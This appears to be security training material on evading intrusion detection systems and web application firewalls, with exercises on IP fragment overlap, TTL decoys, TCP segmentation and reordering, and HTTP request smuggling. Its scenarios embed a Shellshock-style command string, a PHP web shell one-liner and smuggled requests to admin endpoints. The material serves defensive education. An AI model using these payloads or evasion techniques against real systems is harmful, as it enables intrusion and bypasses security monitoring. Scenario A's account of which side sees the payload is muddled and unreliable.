// FRAGMENTATION QUESTIONS

The Snort rule uses depth:128 and flags:PA — it matches only on full unfragmented TCP segments. Fragmented packets have the MF (More Fragments) bit set or a non-zero offset; the rule cannot match across fragment boundaries without reassembly.

// MODULE 02 — Protocol-Level Evasion

DIFFICULTY: INTERMEDIATE// Match each evasion technique to its bypass mechanism
Beyond fragmentation, attackers manipulate protocol fields — TTL values, overlapping fragment offsets, TCP segment boundaries, and delivery ordering — to exploit differences between how the IDS and the end-host reconstruct traffic. Match each scenario to its technique.
SCENARIO A
Attacker sends two overlapping IP fragments: Frag #1: offset=0, len=16, payload="AAAAAAAA/bin/sh" Frag #2: offset=1, len=16, payload="BBBBBBBBharmless" IDS reassembles using first-fragment-wins (BSD policy): sees "AAAAAAAA/bin/sh..." Target host reassembles using last-fragment-wins (Linux policy): sees "AAAAAAAAAharmless..." IDS sees malicious payload; host executes it. OR vice versa depending on policies.
SCENARIO B
Attacker sends packets with TTL=1 toward IDS, TTL=64 toward target: Packet #1: TTL=1, payload="() { :;}; /bin/" → IDS receives it (on same segment) Packet #2: TTL=1, payload="bash -c 'evil'" → IDS sees decoy stream Real pkts : TTL=64, payload split via fragmentation IDS processes decoy packets (TTL sufficient to reach IDS). Decoys die before reaching end host. IDS reassembles wrong stream.
SCENARIO C
Attacker sends a full HTTP request split into 1-byte TCP segments: Segment 1: "G" | Segment 2: "E" | Segment 3: "T" Segment 4: " " | Segment 5: "/" | Segment 6: "s" ... Content-match IDS rules with depth/within anchors may fail to match across many small segments if the IDS lacks full stream reassembly. The host's TCP stack assembles the complete "GET /shell.php?cmd=..." normally.
SCENARIO D
Attacker sends TCP segments out of order: Seq#300: "bash" (arrives 1st at IDS) Seq#100: "() { :" (arrives 3rd at IDS — IDS may have flushed buffer) Seq#200: ";} /bin/"(arrives 2nd) If IDS has a small reorder buffer / short timeout, it may give up reassembling the stream and pass it through. Host TCP stack handles reordering natively.

// MODULE 03 — HTTP Request Smuggling

DIFFICULTY: ADVANCED// Identify which requests bypass WAF inspection
HTTP Request Smuggling exploits disagreement between a WAF/proxy and the backend server on where one HTTP request ends and the next begins. The WAF sees one request; the backend processes a different one. Identify which of the 4 requests below would evade a WAF using Content-Length for body parsing.
REQ-1: Normal POST
POST /login HTTP/1.1 Host: target.corp Content-Length: 27 Connection: keep-alive username=admin&password=x
REQ-2: CL.TE Smuggle
POST / HTTP/1.1 Host: target.corp Content-Length: 13 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X
REQ-3: Dual CL Header
POST /api/upload HTTP/1.1 Host: target.corp Content-Length: 10 Content-Length: 999 legitimate <?php system($_GET['c']);?> [... 989 bytes of payload ...]
REQ-4: TE.CL Smuggle
POST / HTTP/1.1 Host: target.corp Transfer-Encoding: chunked Content-Length: 4 5e POST /admin/deleteUser HTTP/1.1 Host: target.corp Content-Length: 15 user=administrator 0

// HTTP SMUGGLING QUESTIONS

CL.TE: WAF uses Content-Length, backend uses Transfer-Encoding. TE.CL: WAF uses Transfer-Encoding, backend uses Content-Length. The disagreement leaves a smuggled prefix that prepends to the next victim's request.
